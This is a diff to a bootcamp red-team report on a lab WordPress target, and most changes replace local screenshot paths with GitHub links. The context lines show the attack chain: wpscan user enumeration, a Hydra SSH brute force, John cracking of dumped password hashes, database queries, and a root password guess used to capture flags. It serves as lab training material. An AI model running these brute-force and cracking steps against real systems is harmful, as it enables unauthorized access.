@@ -47,8 +47,8 @@ The Red Team was able to penetrate Target 1 and retrieve the following confident
 		- Command:
 			- '$ wpscan --url 192.168.1.110/wordpress'
 			   $ wpscan --url 192.168.1.110 --enumerate -u'
+		- [WPSCAN Screenshot](https://github.com/hart2533/FINAL-CYBER-PROJECT/blob/main/RED-TEAM/IMAGES/wpscan.png)
 
-            C:\Users\17202\Desktop\Ashley's Bootcamp\GitHub\Project 1\FINAL-CYBER-PROJECT\RED-TEAM\IMAGES\wpscan.png
 
 	- Targeting the user 'michael'
 		- Small manual Brute Force attack to guess/finds Michael's password.
@@ -56,7 +56,7 @@ The Red Team was able to penetrate Target 1 and retrieve the following confident
 		- Second, for pratice, Hydra can be used to crack Michaels's password:
 			- Command: 'hydra -l michael -P /usr/share/wordlists/rockyou.txt -vV 192.168.1.110 -t 4 ssh
 		    
-            C:\Users\17202\Desktop\Ashley's Bootcamp\GitHub\Project 1\FINAL-CYBER-PROJECT\RED-TEAM\IMAGES\hydra-command-2.png		
+            	- [HYDRA Screenshot](https://github.com/hart2533/FINAL-CYBER-PROJECT/blob/main/RED-TEAM/IMAGES/hydra-command-2.png)		
 
 
 	- Capturing Flag1: SSH in as Michael, transvering through directories and files.
@@ -68,7 +68,9 @@ The Red Team was able to penetrate Target 1 and retrieve the following confident
 			- 'ls -l'
 			- 'nano services.html'
 			
-            C:\Users\17202\Desktop\Ashley's Bootcamp\GitHub\Project 1\FINAL-CYBER-PROJECT\RED-TEAM\IMAGES\flag1.png
+		- [FLAG1 Screenshot](https://github.com/hart2533/FINAL-CYBER-PROJECT/blob/main/RED-TEAM/IMAGES/flag1.png)
+			
+            	
 
 
 **flag2.txt: '{fc3fd5Bdcdad9ab23facac6e9a365e581c33}'
@@ -85,8 +87,8 @@ Exploit Used
 			- 'cd /var/www'
 			- 'ls -l'
 			- 'cat flag2.txt'
-			
-            C:\Users\17202\Desktop\Ashley's Bootcamp\GitHub\Project 1\FINAL-CYBER-PROJECT\RED-TEAM\IMAGES\flag2.png
+		
+		- [FLAG2 Screenshot](https://github.com/hart2533/FINAL-CYBER-PROJECT/blob/main/RED-TEAM/IMAGES/flag2.png)
 
 **flag3.txt: '{afc01ab56b50591e7dccf93122770cd23}'
 
@@ -100,7 +102,7 @@ Exploit Used:
 		- 'use wordpress;'
 		- 'select * from wp_posts;
 		
-        C:\Users\17202\Desktop\Ashley's Bootcamp\GitHub\Project 1\FINAL-CYBER-PROJECT\RED-TEAM\IMAGES\flag3.png
+       	- [FLAG3 Screenshot](https://github.com/hart2533/FINAL-CYBER-PROJECT/blob/main/RED-TEAM/IMAGES/flag3.png)
 
 **flag4.txt: '{715dea6c055b9fe3337544932F2941ce}'
 
@@ -120,7 +122,7 @@ Exploit Used:
 	- Command:
 		- 'john wp_hashes.txt'
 		
-        C:\Users\17202\Desktop\Ashley's Bootcamp\GitHub\Project 1\FINAL-CYBER-PROJECT\RED-TEAM\IMAGES\steven-password-2.png
+        [John Command Screenshot](https://github.com/hart2533/FINAL-CYBER-PROJECT/blob/main/RED-TEAM/IMAGES/steven-password-2.png)
         
 
 	- Once the user Steven's password hash was crached, the next step was to SSH in the server as Steven. Under the user Steven, privileges will first be checked, and escalated to root by guessing common root           passwords.
@@ -133,4 +135,4 @@ Exploit Used:
 		- 'find /-iname flag*'
 		- 'cat /root/flag4.txt
 		
-        C:\Users\17202\Desktop\Ashley's Bootcamp\GitHub\Project 1\FINAL-CYBER-PROJECT\RED-TEAM\IMAGES\flag4.png
+        - [FLAG4 Screenshot](https://github.com/hart2533/FINAL-CYBER-PROJECT/blob/main/RED-TEAM/IMAGES/flag4.png)
